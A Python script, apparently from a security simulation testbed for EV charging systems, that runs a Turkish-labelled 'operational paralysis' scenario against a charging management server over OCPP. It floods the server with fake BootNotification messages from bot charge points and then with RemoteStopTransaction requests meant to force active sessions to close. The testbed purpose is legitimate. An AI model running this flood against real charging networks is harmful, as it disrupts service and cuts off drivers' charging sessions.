"""
scenario_02_operasyonel_felc/simulate.py
Operasyonel Felç (DoS) senaryosunu çalıştırır:
- Sahte BootNotification yağmuru (Botnet / sahte EVSE taklidi)
- RemoteStopTransaction seli (aktif oturumları zorla kapatma denemesi)
"""

import asyncio
import websockets

import infra.pipeline as pipeline
from infra.pipeline import process_ocpp_message
from infra.config import CONFIG

BOOT_FLOOD_COUNT = 100        # Kaç sahte boot gönderilecek
BOOT_BURST_DELAY = 0.01       # İstekler arası gecikme (saniye)
REMOTE_STOP_COUNT = 50        # Kaç RemoteStopTransaction isteği
REMOTE_STOP_DELAY = 0.005     # RemoteStop istekler arası gecikme


def set_active_scenario():
    pipeline.ACTIVE_SCENARIO = "scenario_02_operasyonel_felc"
    print(f"[SCENARIO] Active scenario set -> {pipeline.ACTIVE_SCENARIO}")


async def run_operational_paralysis():
    csms_url = CONFIG["csms_url"]
    print(f"[SCENARIO] Connecting to CSMS at {csms_url}")

    async with websockets.connect(csms_url) as ws:
        print(f"[DoS] BootNotification flood basliyor x{BOOT_FLOOD_COUNT}")
        for i in range(BOOT_FLOOD_COUNT):
            payload = {
                "chargePointVendor": "DosBot",
                "chargePointModel": "Bot-LoadGen",
                "chargeBoxSerialNumber": f"dos-bot-{i:05d}",
                "chargePointSerialNumber": f"dos-cp-{i:05d}",
            }
            await process_ocpp_message("BootNotification", payload, ws)
            if BOOT_BURST_DELAY:
                await asyncio.sleep(BOOT_BURST_DELAY)

        print(f"[DoS] RemoteStopTransaction seli basliyor x{REMOTE_STOP_COUNT}")
        for j in range(REMOTE_STOP_COUNT):
            payload = {"transactionId": f"tx-stop-{j:05d}"}
            await process_ocpp_message("RemoteStopTransaction", payload, ws)
            if REMOTE_STOP_DELAY:
                await asyncio.sleep(REMOTE_STOP_DELAY)

    print("[SCENARIO] Operasyonel Felc denemesi tamamlandi.")


if __name__ == "__main__":
    set_active_scenario()
    asyncio.run(run_operational_paralysis())
